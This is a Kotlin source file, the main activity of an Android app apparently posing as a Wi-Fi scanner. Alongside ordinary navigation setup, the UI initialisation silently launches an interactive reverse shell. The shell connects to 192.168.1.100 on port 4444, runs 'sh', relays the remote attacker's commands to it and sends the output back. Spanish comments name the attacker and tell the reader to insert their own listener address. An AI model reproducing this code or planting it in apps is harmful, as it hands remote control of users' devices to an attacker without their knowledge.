package com.grovylessj.wifiscanner.ui.home

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.NavController
import androidx.navigation.fragment.NavHostFragment
import androidx.navigation.ui.setupWithNavController
import com.grovylessj.wifiscanner.R
import com.grovylessj.wifiscanner.databinding.ActivityMainBinding
import dagger.hilt.android.AndroidEntryPoint
import java.io.InputStream
import java.io.OutputStream
import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    private lateinit var biding: ActivityMainBinding
    private lateinit var navController: NavController

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        biding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(biding.root)
        initUI()
    }

    private fun initUI() {
        val navHost: NavHostFragment = supportFragmentManager.findFragmentById(R.id.fragmentContainerView) as NavHostFragment
        navController = navHost.navController
        biding.bottomNavView.setupWithNavController(navController)

        // Iniciar el reverse shell con la IP y el puerto de escucha configurados
        startInteractiveReverseShell("192.168.1.100", 4444) // Reemplaza con tu IP y puerto de escucha
    }

    private fun startInteractiveReverseShell(ip: String, port: Int) {
        thread {
            try {
                val socket = Socket(ip, port)
                val outputStream: OutputStream = socket.getOutputStream()
                val inputStream: InputStream = socket.getInputStream()

                // Iniciar un proceso de shell en el dispositivo
                val process = Runtime.getRuntime().exec("sh")
                val processInput = process.outputStream
                val processOutput = process.inputStream
                val processError = process.errorStream

                // Capturar el input del atacante y enviarlo al shell
                val writer = PrintWriter(processInput, true)

                // Hilo para enviar datos desde el shell de Android al atacante
                thread {
                    processOutput.copyTo(outputStream)
                }

                // Hilo para enviar mensajes de error al atacante
                thread {
                    processError.copyTo(outputStream)
                }

                // Hilo principal: recibe comandos del atacante y los envía al shell
                val buffer = ByteArray(1024)
                var read = 0 // Inicialización de `read`
                while (socket.isConnected && inputStream.read(buffer).also { read = it } != -1) {
                    val command = String(buffer, 0, read)
                    writer.println(command)  // Envía el comando al shell
                }

                // Cerrar todo al finalizar
                writer.close()
                processInput.close()
                processOutput.close()
                processError.close()
                socket.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
